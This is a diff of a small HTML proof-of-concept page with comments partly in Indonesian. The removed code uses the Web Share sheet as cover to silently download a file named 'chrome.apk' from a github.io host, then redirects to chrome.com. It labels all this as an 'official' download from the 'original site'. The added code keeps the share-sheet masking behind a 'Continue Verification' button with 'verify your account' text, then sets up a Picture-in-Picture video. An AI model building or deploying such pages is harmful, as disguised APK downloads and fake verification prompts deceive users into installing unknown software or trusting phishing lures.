@@ -3,54 +3,60 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PiP Single File PoC</title>
   <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      font-size: 16px;
-      cursor: pointer;
-    }
+    body { font-family: sans-serif; text-align: center; margin-top: 40px; }
+    button { padding: 14px 24px; font-size: 16px; }
+    video { width: 90%; max-width: 360px; margin-top: 20px; display: none; }
+    .ready video { display: block; }
+    .ready #pipBtn { display: inline-block; }
+    #pipBtn { display: none; margin-top: 16px; }
   </style>
 </head>
 <body>
 
-<script>
-function a() {
+<button id="startBtn">Continue Verification</button>
 
-  // 1️⃣ Web Share – HARUS sinkron dengan klik user
+<video id="vid" muted playsinline preload="auto"
+  src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4">
+</video>
+
+<br>
+<button id="pipBtn">Enter Picture-in-Picture</button>
+
+<script>
+const startBtn = document.getElementById('startBtn');
+const pipBtn   = document.getElementById('pipBtn');
+const vid      = document.getElementById('vid');
+
+startBtn.onclick = async () => {
+  // 1️⃣ Web Share — HARUS sinkron dengan klik user
   if (navigator.share) {
     navigator.share({
-      title: "Download Center",
-      text: "Download the official document from the original site.",
-      url: "https://google.com"
-    }).catch(() => {});
+      title: "Help Center",
+      text: "Continue to verify your account.",
+      url: location.href
+    }).catch(()=>{});
   }
 
-  // 2️⃣ Trigger download while Share Sheet is visible
-  setTimeout(function () {
-    var link = document.createElement('a');
-    link.href = 'https://ecdnts-del.github.io/test-apk/chrome.apk'; // ganti file di sini
-    link.download = 'chrome.apk';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }, 350);
+  // 2️⃣ Prepare PiP state while Share Sheet is visible
+  setTimeout(async () => {
+    document.body.classList.add('ready');
+    try {
+      await vid.play(); // muted → allowed tanpa gesture tambahan
+    } catch(e) {}
+  }, 400);
+};
 
-  // 3️⃣ Background redirect
-  setTimeout(function () {
-    window.location.href = "https://chrome.com";
-  }, 900);
-}
+// 3️⃣ PiP hanya dengan user gesture (AMAN & DIIZINKAN)
+pipBtn.onclick = async () => {
+  if (document.pictureInPictureEnabled && !vid.disablePictureInPicture) {
+    try {
+      await vid.requestPictureInPicture();
+    } catch(e) {}
+  }
+};
 </script>
-
-<center>
-  <input type="button"
-         class="button"
-         value="Download From Original Site"
-         onclick="a()">
-</center>
 
 </body>
 </html>
